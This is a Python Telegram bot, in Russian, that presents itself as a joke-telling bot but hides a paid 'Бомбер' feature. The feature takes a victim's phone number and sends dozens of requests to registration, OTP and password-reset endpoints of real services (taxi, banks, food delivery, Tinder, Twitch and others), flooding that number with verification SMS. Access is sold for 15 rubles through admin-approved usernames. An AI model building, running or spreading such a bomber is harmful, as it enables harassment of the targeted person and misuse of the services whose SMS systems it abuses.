# -*- coding: utf-8 -*-
import sqlite3

import requests
from config import TOKEN
import telebot
from telebot import types
import random2 as random
import requests


bot = telebot.TeleBot(token=TOKEN)

con = sqlite3.connect('a.db',check_same_thread=False)
cursor = con.cursor()

admin = []


@bot.message_handler(commands=['start'])
def welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=3)
    item1 = types.InlineKeyboardButton('Да', callback_data='joke')
    item2 = types.InlineKeyboardButton('Конечно', callback_data='joke')
    markup.add(item1,item2)
    bot.send_message(message.chat.id, "Хочешь расскажу тебе шутку?", reply_markup=markup)

def joke(message):
    cursor.execute(f'SELECT * FROM a WHERE id = {random.randint(1,32640)}')
    record = cursor.fetchall()
    markup = types.ReplyKeyboardMarkup(resize_keyboard = True)
    item1 = types.KeyboardButton('Бомбер')
    item2 = types.KeyboardButton('Давай еще одну')
    markup.add(item1,item2)

    bot.send_message(message.chat.id, text=[i[1] for i in record], reply_markup=markup)

def phone(message):
    msg = bot.send_message(message.chat.id, "Напиши номер телефона (79*********: ")
    bot.register_next_step_handler(msg, bomber)

def bomber(message):
    phone = message.text

    for x in range(12):
        name = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phoneAresBank = '+'+phone[0]+'('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
    phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]
    phoneOstin = '+'+phone[0]+'+('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
    phonePizzahut = '+'+phone[0]+' ('+phone[1:4]+') '+phone[4:7]+' '+phone[7:9]+' '+phone[9:11]
    phoneGorzdrav = phone[1:4]+') '+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]

    _email = name+f'{random.randint(0,1000)}'+'@gmail.com'

    bot.send_message(message.chat.id, "Выполняю...")

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    except:
        pass
    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]

    except:
        pass
    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})

    except:
        pass

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        bot.send_message(message.chat.id, "Выполнено 5%")
    except:
        bot.send_message(message.chat.id, "Выполнено 5%")

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
    except:
        pass

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
    except:
        pass

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
    except:
        pass

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
    except:
        pass

    try:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})
    except:
        pass

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})

    except:
        pass

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})

    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        bot.send_message(message.chat.id, "Выполнено 11%")
    except:
        bot.send_message(message.chat.id, "Выполнено 11%")

    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')
    except:
        pass

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
    except:
        pass

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})

    except:
        pass

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})

    except:
        pass

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobilephone': phone, 'deliveryOption': 'sms'})

    except:
        pass

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})

    except:
        pass

    try:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})

    except:
        pass

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        bot.send_message(message.chat.id, "Выполнено 22%")
    except:
        bot.send_message(message.chat.id, "Выполнено 23%")

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})

    except:
        pass

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})

    except:
        pass

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})

    except:
        pass

    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')

    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})

    except:
        pass

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + phone})

    except:
        pass

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone}})

    except:
        pass

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})

    except:
        pass

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})

    except:
        pass

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})

    except:
        pass

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": phone})

    except:
        pass

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone})

    except:
        pass

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone})

    except:
        pass

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
    except:
        pass

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""})

    except:
        pass

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone})
    except:
        pass

    try:
        requests.post('https://plink.tech/register/',json={"phone": phone})
        bot.send_message(message.chat.id, "Выполнено 75%")
    except:
        bot.send_message(message.chat.id, "Выполнено 75%")

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})

    except:
        pass

    try:
        requests.post("http://smsgorod.ru/sendsms.php",data={"number": phone})

    except:
        pass

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})

    except:
        pass

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": username})

    except:
        pass

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'})
    except:
        pass

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2})

    except:
        pass

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone})

    except:
        pass

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
        bot.send_message(message.chat.id, "Выполнено 95%")
    except:
        bot.send_message(message.chat.id, "Выполнено 95%")

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{_email}@gmail.ru","mobilephone": phone, "deliveryOption": "sms"})

    except:
        pass

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
    except:
        pass

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})

    except:
        pass


    bot.send_message(message.chat.id, "Выполнено!")

@bot.message_handler(content_types='text')
def answer(message):
    if message.chat.type == 'private':
        if message.text == 'Давай еще одну':
            joke(message)
        elif message.text == "Бомбер":
            if len(admin) > 0:
                if message.from_user.username in admin:
                    phone(message)
                else:
                    bot.send_message(message.chat.id, "Пришлите 15р по таким на реквезиты **********\nВ сообщение укажите имя пользователя (@***)")
            else:
                bot.send_message(message.chat.id, "Пришлите 15р по таким на реквезиты **********\nВ сообщение укажите имя пользователя (@***)")
        elif message.text.split()[0] == "!add" and message.from_user.username == "nechyrkaser": #Имя пользователя для админки
            admin.append(message.text.split()[1])
        elif message.text.split()[0] == "!remove":
            if message.text.split()[1] in admin and  message.from_user.username == "nechyrkaser": #Имя пользователя для админки
                admin.remove(message.text.split()[1])
            else:
                bot.send_message(message.chat.id, "Такого пользователя итак нет!")

@bot.callback_query_handler(func = lambda call: True)
def callback(call):
    if call.message:
        if call.data == 'joke':
            joke(call.message)
bot.infinity_polling(timeout=10, long_polling_timeout=5)